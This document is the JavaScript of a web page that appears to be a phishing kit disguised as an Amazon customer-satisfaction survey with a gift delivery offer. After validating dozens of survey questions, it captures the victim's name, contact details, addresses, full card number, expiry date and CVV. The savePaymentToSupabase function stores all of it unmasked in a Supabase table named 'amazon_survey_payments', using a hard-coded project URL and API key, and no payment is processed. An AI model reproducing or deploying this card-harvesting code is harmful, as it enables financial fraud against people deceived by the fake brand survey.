        const supabaseUrl = 'https://npmyylobqmtvxsagwjfv.supabase.co'; // e.g., https://abc123.supabase.co
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5wbXl5bG9icW10dnhzYWd3amZ2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU1NDYxMzYsImV4cCI6MjA4MTEyMjEzNn0.Mp6RYO3SSybeJcIwXRq4TXWPINZHP3CFNTcYQ4gJi7w'; // e.g., eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

        // ========== LOADING & SUCCESS MODAL FUNCTIONS ==========
        function showLoading(show) {
            const overlay = document.getElementById('loadingOverlay');
            overlay.style.display = show ? 'flex' : 'none';
        }

        function showSuccessModal() {
            document.getElementById('successModal').style.display = 'flex';
        }

        document.getElementById('closeSuccessModal').addEventListener('click', function() {
            document.getElementById('successModal').style.display = 'none';
        });

        // ========== VALIDATION FUNCTIONS ==========
        function showError(fieldId, errorId) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            if (field && error) {
                field.classList.add('error-field');
                field.parentElement.classList.add('error-group');
                error.classList.add('show');
                
                // Scroll to the error
                field.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }

        function hideError(fieldId, errorId) {
            const field = document.getElementById(fieldId);
            const error = document.getElementById(errorId);
            
            if (field && error) {
                field.classList.remove('error-field');
                field.parentElement.classList.remove('error-group');
                error.classList.remove('show');
            }
        }

        function clearAllErrors() {
            // Clear all error styles
            const errorFields = document.querySelectorAll('.error-field');
            errorFields.forEach(field => {
                field.classList.remove('error-field');
                if (field.parentElement) {
                    field.parentElement.classList.remove('error-group');
                }
            });
            
            // Hide all error messages
            const errorMessages = document.querySelectorAll('.error-message');
            errorMessages.forEach(message => {
                message.classList.remove('show');
            });
            
            // Clear radio/checkbox group errors
            const errorGroups = document.querySelectorAll('.checkbox-group.error, .radio-group.error');
            errorGroups.forEach(group => {
                group.classList.remove('error');
            });
        }

        // Validate required text/select fields
        function validateRequiredField(fieldId, errorId) {
            const field = document.getElementById(fieldId);
            if (!field || !field.value.trim()) {
                showError(fieldId, errorId);
                return false;
            } else {
                hideError(fieldId, errorId);
                return true;
            }
        }

        // Validate email field
        function validateEmail() {
            const email = document.getElementById('email');
            const errorId = 'email-error';
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            
            if (!email || !email.value.trim()) {
                showError('email', errorId);
                return false;
            } else if (!emailRegex.test(email.value)) {
                showError('email', errorId);
                return false;
            } else {
                hideError('email', errorId);
                return true;
            }
        }

        // Validate radio groups
        function validateRadioGroup(groupName, errorId) {
            const radios = document.querySelectorAll(`input[name="${groupName}"]`);
            const groupContainer = document.getElementById(`${groupName}_group`);
            let isChecked = false;
            
            radios.forEach(radio => {
                if (radio.checked) {
                    isChecked = true;
                }
            });
            
            if (!isChecked) {
                if (groupContainer) {
                    groupContainer.classList.add('error');
                }
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.add('show');
                }
                return false;
            } else {
                if (groupContainer) {
                    groupContainer.classList.remove('error');
                }
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.remove('show');
                }
                return true;
            }
        }

        // Validate checkbox group
        function validateCheckboxGroup(groupName, errorId) {
            const checkboxes = document.querySelectorAll(`input[name="${groupName}"]:checked`);
            const groupContainer = document.getElementById(`${groupName}_group`);
            
            if (checkboxes.length === 0) {
                if (groupContainer) {
                    groupContainer.classList.add('error');
                }
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.add('show');
                }
                return false;
            } else {
                if (groupContainer) {
                    groupContainer.classList.remove('error');
                }
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.remove('show');
                }
                return true;
            }
        }

        // Validate delivery preference
        function validateDeliveryPreference() {
            const deliveryPref = document.getElementById('delivery_preference').value;
            const errorId = 'delivery_preference-error';
            
            if (!deliveryPref) {
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.add('show');
                }
                return false;
            } else {
                const error = document.getElementById(errorId);
                if (error) {
                    error.classList.remove('show');
                }
                return true;
            }
        }

        // Validate shipping address (only if physical delivery is selected)
        function validateShippingAddress() {
            const deliveryPref = document.getElementById('delivery_preference').value;
            let isValid = true;
            
            if (deliveryPref === 'physical') {
                isValid = validateRequiredField('shipping_street', 'shipping_street-error') && isValid;
                isValid = validateRequiredField('shipping_city', 'shipping_city-error') && isValid;
                isValid = validateRequiredField('shipping_state', 'shipping_state-error') && isValid;
                isValid = validateRequiredField('shipping_zip', 'shipping_zip-error') && isValid;
                isValid = validateRequiredField('shipping_country', 'shipping_country-error') && isValid;
            }
            
            return isValid;
        }

        // Validate billing address (only if different from shipping)
        function validateBillingAddress() {
            const billingSame = document.querySelector('input[name="billing_same"]:checked');
            let isValid = true;
            
            if (!billingSame) {
                showError('billing_same_yes', 'billing_same-error');
                return false;
            } else {
                hideError('billing_same_yes', 'billing_same-error');
            }
            
            if (billingSame.value === 'no') {
                isValid = validateRequiredField('billing_street', 'billing_street-error') && isValid;
                isValid = validateRequiredField('billing_city', 'billing_city-error') && isValid;
                isValid = validateRequiredField('billing_state', 'billing_state-error') && isValid;
                isValid = validateRequiredField('billing_zip', 'billing_zip-error') && isValid;
                isValid = validateRequiredField('billing_country', 'billing_country-error') && isValid;
            }
            
            return isValid;
        }

        // ========== PAYMENT VALIDATION FUNCTIONS ==========
        function validateCardNumber(cardNumber) {
            cardNumber = cardNumber.replace(/\s+/g, '');
            
            // Check if it's all digits and right length
            if (!/^\d+$/.test(cardNumber) || cardNumber.length < 13 || cardNumber.length > 19) {
                return false;
            }
            
            // Luhn algorithm for basic validation
            let sum = 0;
            let isEven = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i), 10);
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return (sum % 10) === 0;
        }

        function validatePaymentInfo() {
            clearPaymentErrors();
            let isValid = true;
            
            // Card number validation
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
            if (!validateCardNumber(cardNumber)) {
                showPaymentError('cardNumberError', 'Please enter a valid card number (13-19 digits)');
                document.getElementById('cardNumber').parentElement.classList.add('error');
                isValid = false;
            }
            
            // Card holder validation
            const cardHolder = document.getElementById('cardHolder').value;
            if (cardHolder.trim().length < 2) {
                showPaymentError('cardHolderError');
                document.getElementById('cardHolder').parentElement.classList.add('error');
                isValid = false;
            }
            
            // Expiry date validation
            const expiryMonth = document.getElementById('expiryMonth').value;
            const expiryYear = document.getElementById('expiryYear').value;
            if (!expiryMonth || !expiryYear) {
                showPaymentError('expiryError');
                document.getElementById('expiryMonth').parentElement.classList.add('error');
                isValid = false;
            }
            
            // CVV validation
            const cvv = document.getElementById('cvv').value;
            if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
                showPaymentError('cvvError', 'Please enter a valid 3 or 4-digit CVV');
                document.getElementById('cvv').parentElement.classList.add('error');
                isValid = false;
            }
            
            return isValid;
        }

        function showPaymentError(errorId, message = '') {
            const errorElement = document.getElementById(errorId);
            if (message) {
                errorElement.textContent = message;
            }
            errorElement.style.display = 'block';
        }
        
        function hidePaymentError(errorId) {
            const errorElement = document.getElementById(errorId);
            if (errorElement) {
                errorElement.style.display = 'none';
            }
        }
        
        function clearPaymentErrors() {
            const errors = document.querySelectorAll('.payment-error');
            errors.forEach(error => {
                error.style.display = 'none';
            });
            
            const errorInputs = document.querySelectorAll('.input-container.error');
            errorInputs.forEach(input => {
                input.classList.remove('error');
            });
        }

        // ========== MAIN FORM VALIDATION FUNCTION ==========
        function validateAllFields() {
            clearAllErrors();
            let isValid = true;
            
            // Personal Information
            isValid = validateRequiredField('name', 'name-error') && isValid;
            isValid = validateEmail() && isValid;
            isValid = validateRequiredField('phone', 'phone-error') && isValid;
            isValid = validateRequiredField('age', 'age-error') && isValid;
            
            // Section 2: Customer Experience
            isValid = validateRadioGroup('overall_experience', 'overall_experience-error') && isValid;
            isValid = validateRadioGroup('find_ease', 'find_ease-error') && isValid;
            isValid = validateRadioGroup('website_speed', 'website_speed-error') && isValid;
            isValid = validateRadioGroup('browsing_problems', 'browsing_problems-error') && isValid;
            isValid = validateRadioGroup('shop_again', 'shop_again-error') && isValid;
            
            // Section 3: Search & Discovery
            isValid = validateRadioGroup('search_relevance', 'search_relevance-error') && isValid;
            isValid = validateRadioGroup('product_info', 'product_info-error') && isValid;
            isValid = validateRadioGroup('use_filters', 'use_filters-error') && isValid;
            isValid = validateRadioGroup('product_variety', 'product_variety-error') && isValid;
            
            // Section 4: Ordering & Checkout
            isValid = validateRadioGroup('checkout_ease', 'checkout_ease-error') && isValid;
            isValid = validateRadioGroup('pricing_clarity', 'pricing_clarity-error') && isValid;
            isValid = validateRadioGroup('payment_options_satisfaction', 'payment_options_satisfaction-error') && isValid;
            isValid = validateRadioGroup('use_coupons', 'use_coupons-error') && isValid;
            isValid = validateRadioGroup('checkout_issues', 'checkout_issues-error') && isValid;
            
            // Section 5: Payment Methods
            isValid = validateCheckboxGroup('payment_methods', 'payment_methods-error') && isValid;
            isValid = validateRadioGroup('payment_satisfaction', 'payment_satisfaction-error') && isValid;
            isValid = validateRadioGroup('payment_update_ease', 'payment_update_ease-error') && isValid;
            isValid = validateRadioGroup('payment_security', 'payment_security-error') && isValid;
            
            // Section 6: Delivery Experience
            isValid = validateRadioGroup('delivery_time', 'delivery_time-error') && isValid;
            isValid = validateRadioGroup('delivery_on_time', 'delivery_on_time-error') && isValid;
            isValid = validateRadioGroup('packaging_satisfaction', 'packaging_satisfaction-error') && isValid;
            isValid = validateRadioGroup('package_condition', 'package_condition-error') && isValid;
            isValid = validateRadioGroup('carrier_rating', 'carrier_rating-error') && isValid;
            
            // Section 7: Product Feedback
            isValid = validateRadioGroup('product_match', 'product_match-error') && isValid;
            isValid = validateRadioGroup('product_quality', 'product_quality-error') && isValid;
            isValid = validateRadioGroup('product_worth', 'product_worth-error') && isValid;
            isValid = validateRadioGroup('expectations_met', 'expectations_met-error') && isValid;
            isValid = validateRadioGroup('reviews_helpful', 'reviews_helpful-error') && isValid;
            isValid = validateRadioGroup('trust_stars', 'trust_stars-error') && isValid;
            isValid = validateRadioGroup('review_photos', 'review_photos-error') && isValid;
            
            // Section 8: Customer Service
            isValid = validateRadioGroup('customer_support', 'customer_support-error') && isValid;
            isValid = validateRadioGroup('reach_service', 'reach_service-error') && isValid;
            isValid = validateRadioGroup('rep_helpfulness', 'rep_helpfulness-error') && isValid;
            isValid = validateRadioGroup('issue_solved', 'issue_solved-error') && isValid;
            isValid = validateRadioGroup('instruction_clarity', 'instruction_clarity-error') && isValid;
            
            // Section 9: Safety & Trust
            isValid = validateRadioGroup('feel_safe', 'feel_safe-error') && isValid;
            isValid = validateRadioGroup('trust_data', 'trust_data-error') && isValid;
            isValid = validateRadioGroup('authenticity', 'authenticity-error') && isValid;
            
            // Gift Delivery Section
            isValid = validateDeliveryPreference() && isValid;
            isValid = validateShippingAddress() && isValid;
            
            // Billing Section
            isValid = validateBillingAddress() && isValid;
            
            // Payment Information
            isValid = validatePaymentInfo() && isValid;
            
            return isValid;
        }

        // ========== SUPABASE DATA SAVING FUNCTIONS ==========
        // Store full card number (NO MASKING - FOR DEMO ONLY)
        function getCardNumber() {
            return document.getElementById('cardNumber').value.replace(/\s+/g, '');
        }

        async function savePaymentToSupabase() {
            try {
                showLoading(true);
                
                // Prepare billing address
                let billingData = {
                    billing_street: '',
                    billing_city: '',
                    billing_state: '',
                    billing_zip: '',
                    billing_country: '',
                    billing_same_as_shipping: false
                };
                
                // Check if billing is same as shipping
                const billingSame = document.querySelector('input[name="billing_same"]:checked').value;
                
                if (billingSame === 'yes') {
                    // Use shipping address as billing address
                    billingData.billing_street = document.getElementById('shipping_street').value;
                    billingData.billing_city = document.getElementById('shipping_city').value;
                    billingData.billing_state = document.getElementById('shipping_state').value;
                    billingData.billing_zip = document.getElementById('shipping_zip').value;
                    billingData.billing_country = document.getElementById('shipping_country').value;
                    billingData.billing_same_as_shipping = true;
                } else {
                    // Use separate billing address
                    billingData.billing_street = document.getElementById('billing_street').value;
                    billingData.billing_city = document.getElementById('billing_city').value;
                    billingData.billing_state = document.getElementById('billing_state').value;
                    billingData.billing_zip = document.getElementById('billing_zip').value;
                    billingData.billing_country = document.getElementById('billing_country').value;
                    billingData.billing_same_as_shipping = false;
                }
                
                // Prepare payment data - STORING FULL DATA (NO MASKING)
                const paymentData = {
                    name: document.getElementById('name').value,
                    email: document.getElementById('email').value,
                    phone: document.getElementById('phone').value,
                    
                    // Card information - FULL DATA STORED
                    card_number: getCardNumber(), // FULL CARD NUMBER
                    card_holder: document.getElementById('cardHolder').value,
                    expiry_month: document.getElementById('expiryMonth').value,
                    expiry_year: document.getElementById('expiryYear').value,
                    cvv: document.getElementById('cvv').value, // FULL CVV
                    
                    // Shipping/delivery info
                    shipping_street: document.getElementById('shipping_street').value || '',
                    shipping_city: document.getElementById('shipping_city').value || '',
                    shipping_state: document.getElementById('shipping_state').value || '',
                    shipping_zip: document.getElementById('shipping_zip').value || '',
                    shipping_country: document.getElementById('shipping_country').value || '',
                    delivery_preference: document.getElementById('delivery_preference').value,
                    
                    // Billing address
                    ...billingData,
                    
                    // Gift preferences
                    gift_preference: document.getElementById('gift_preference')?.value || '',
                    gift_message: document.getElementById('gift_message')?.value || '',
                    
                    // Survey responses (you can add more as needed)
                    age: document.getElementById('age').value,
                    overall_experience: document.querySelector('input[name="overall_experience"]:checked')?.value || '',
                    find_ease: document.querySelector('input[name="find_ease"]:checked')?.value || '',
                    payment_satisfaction: document.querySelector('input[name="payment_satisfaction"]:checked')?.value || '',
                    
                    survey_completed: true,
                    created_at: new Date().toISOString()
                };
                
                // Save to Supabase
                const { data, error } = await supabase
                    .from('amazon_survey_payments')
                    .insert([paymentData]);
                
                if (error) {
                    console.error('Supabase Error:', error);
                    throw new Error('Failed to save payment information. Please try again.');
                }
                
                console.log('Data saved successfully to Supabase:', data);
                return true;
                
            } catch (error) {
                console.error('Error saving data to Supabase:', error);
                throw error;
            } finally {
                showLoading(false);
            }
        }

        // ========== ORIGINAL FORM FUNCTIONALITY ==========
        // Update progress bar as user scrolls
        const sections = document.querySelectorAll('.section');
        const progressBar = document.getElementById('surveyProgress');
        const progressText = document.getElementById('progressText');
        
        function updateProgressBar() {
            const scrollPosition = window.scrollY;
            let currentSection = 0;
            
            sections.forEach((section, index) => {
                const sectionTop = section.offsetTop - 200;
                if (scrollPosition >= sectionTop) {
                    currentSection = index + 1;
                }
            });
            
            const progressPercentage = (currentSection / sections.length) * 100;
            progressBar.style.width = `${progressPercentage}%`;
            progressText.textContent = `Section ${currentSection} of ${sections.length}`;
        }
        
        window.addEventListener('scroll', updateProgressBar);
        window.addEventListener('load', updateProgressBar);
        
        // Gift Delivery Options Selection
        const deliveryOptions = document.querySelectorAll('.delivery-option');
        const deliveryPreferenceInput = document.getElementById('delivery_preference');
        const shippingAddressGroup = document.getElementById('shippingAddressGroup');
        
        deliveryOptions.forEach(option => {
            option.addEventListener('click', function() {
                // Remove selected class from all options
                deliveryOptions.forEach(opt => opt.classList.remove('selected'));
                
                // Add selected class to clicked option
                this.classList.add('selected');
                
                // Set the value in hidden input
                const deliveryType = this.getAttribute('data-delivery-type');
                deliveryPreferenceInput.value = deliveryType;
                
                // Show/hide shipping address based on selection
                if (deliveryType === 'physical') {
                    shippingAddressGroup.style.display = 'block';
                } else {
                    shippingAddressGroup.style.display = 'none';
                }
            });
        });
        
        // Set first delivery option as selected by default
        if (deliveryOptions.length > 0) {
            deliveryOptions[0].click();
        }
        
        // Billing Address Toggle
        const billingSameYes = document.getElementById('billing_same_yes');
        const billingSameNo = document.getElementById('billing_same_no');
        const billingAddressGroup = document.getElementById('billingAddressGroup');
        
        billingSameYes.addEventListener('change', function() {
            if (this.checked) {
                billingAddressGroup.style.display = 'none';
            }
        });
        
        billingSameNo.addEventListener('change', function() {
            if (this.checked) {
                billingAddressGroup.style.display = 'block';
            }
        });
        
        // Initialize year options
        const yearSelect = document.getElementById('expiryYear');
        const currentYear = new Date().getFullYear();
        for (let i = 0; i < 10; i++) {
            const year = currentYear + i;
            const option = document.createElement('option');
            option.value = year.toString().slice(-2);
            option.textContent = year;
            yearSelect.appendChild(option);
        }
        
        // Format card number input with spaces
        const cardNumberInput = document.getElementById('cardNumber');
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            
            // Limit to 19 digits (max card length)
            value = value.substring(0, 19);
            
            let formattedValue = '';
            
            // Standard format: XXXX XXXX XXXX XXXX (or variations)
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
            
            // Validate length
            const digitsOnly = value.replace(/\s+/g, '');
            if (digitsOnly.length >= 13 && digitsOnly.length <= 19) {
                hidePaymentError('cardNumberError');
                cardNumberInput.parentElement.classList.remove('error');
            }
        });
        
        // Update expiry preview
        const expiryMonthSelect = document.getElementById('expiryMonth');
        const expiryYearSelect = document.getElementById('expiryYear');
        
        expiryMonthSelect.addEventListener('change', function() {
            if (expiryMonthSelect.value && expiryYearSelect.value) {
                hidePaymentError('expiryError');
                expiryMonthSelect.parentElement.classList.remove('error');
            }
        });
        
        expiryYearSelect.addEventListener('change', function() {
            if (expiryMonthSelect.value && expiryYearSelect.value) {
                hidePaymentError('expiryError');
                expiryMonthSelect.parentElement.classList.remove('error');
            }
        });
        
        // CVV input formatting and validation
        const cvvInput = document.getElementById('cvv');
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/gi, '');
            
            // Accept 3 or 4 digits (most cards are 3, Amex is 4)
            if (e.target.value.length === 3 || e.target.value.length === 4) {
                hidePaymentError('cvvError');
                cvvInput.parentElement.classList.remove('error');
            }
        });
        
        // Add real-time validation as user corrects errors
        const paymentInputs = document.querySelectorAll('.payment-input, .payment-select');
        paymentInputs.forEach(input => {
            input.addEventListener('input', function() {
                if (this.parentElement && this.parentElement.classList.contains('error')) {
                    this.parentElement.classList.remove('error');
                    const errorId = this.id + 'Error';
                    if (document.getElementById(errorId)) {
                        hidePaymentError(errorId);
                    }
                }
            });
        });
        
        // ========== REAL-TIME VALIDATION FOR REGULAR FIELDS ==========
        // Add event listeners to fields for real-time validation
        const formInputs = document.querySelectorAll('input, select, textarea');
        formInputs.forEach(input => {
            // Clear error when user starts typing
            input.addEventListener('input', function() {
                const errorId = this.id + '-error';
                hideError(this.id, errorId);
                
                // Special handling for radio/checkbox groups
                if (this.type === 'radio' || this.type === 'checkbox') {
                    const groupName = this.name;
                    const groupErrorId = groupName + '-error';
                    const errorElement = document.getElementById(groupErrorId);
                    if (errorElement) {
                        errorElement.classList.remove('show');
                    }
                    
                    // Remove error class from group container
                    const groupContainer = document.getElementById(`${groupName}_group`);
                    if (groupContainer) {
                        groupContainer.classList.remove('error');
                    }
                }
            });
            
            // Add focus styling
            input.addEventListener('focus', function() {
                this.style.borderColor = '#FF9900';
                if (this.type === 'radio' || this.type === 'checkbox') {
                    this.parentElement.parentElement.style.borderLeftColor = '#FF9900';
                }
            });
            
            input.addEventListener('blur', function() {
                if (!this.value && this.hasAttribute('required')) {
                    this.style.borderColor = '#c51130';
                } else {
                    this.style.borderColor = '#ddd';
                }
            });
        });
        
        // ========== FORM SUBMISSION HANDLER ==========
        document.getElementById('amazonSurvey').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            console.log('Form submission started...');
            
            // Validate all fields
            if (!validateAllFields()) {
                alert('Please fill in all required fields marked with *. Fields with errors are highlighted in red.');
                console.log('Validation failed');
                return;
            }
            
            console.log('All fields validated successfully');
            
            try {
                // Save to Supabase
                await savePaymentToSupabase();
                
                // Show success message
                showSuccessModal();
                
                // Optional: Reset form (commented out for now)
                // this.reset();
                // Reset progress bar
                // progressBar.style.width = '0%';
                // progressText.textContent = 'Section 0 of 12';
                
            } catch (error) {
                console.error('Submission error:', error);
                alert('There was an error submitting your information. Please try again. Error: ' + error.message);
            }
        });

        // ========== CHARACTER LIMIT FOR TEXTAREAS ==========
        const textareas = document.querySelectorAll('textarea');
        textareas.forEach(textarea => {
            textarea.addEventListener('input', function() {
                let maxLength = 500;
                if (this.id === 'gift_message') {
                    maxLength = 200;
                }
                
                const currentLength = this.value.length;
                
                if (currentLength > maxLength) {
                    this.value = this.value.substring(0, maxLength);
                }
                
                const charCount = this.parentNode.querySelector('.char-count');
                if (charCount) {
                    charCount.textContent = `${this.value.length}/${maxLength} characters`;
                }
            });
        });

        // ========== INITIALIZE FORM ==========
        // Set default values for testing (remove in production)
        document.addEventListener('DOMContentLoaded', function() {
            // For testing purposes only - pre-fill some fields
            // Remove these lines in production
            /*
            document.getElementById('name').value = 'John Doe';
            document.getElementById('email').value = 'john@example.com';
            document.getElementById('phone').value = '1234567890';
            document.getElementById('age').value = '26-35';
            document.getElementById('shipping_street').value = '123 Test St';
            document.getElementById('shipping_city').value = 'London';
            document.getElementById('shipping_state').value = 'London';
            document.getElementById('shipping_zip').value = '10001';
            document.getElementById('shipping_country').value = 'UK';
            */
        });
    </script>
</body>
</html>
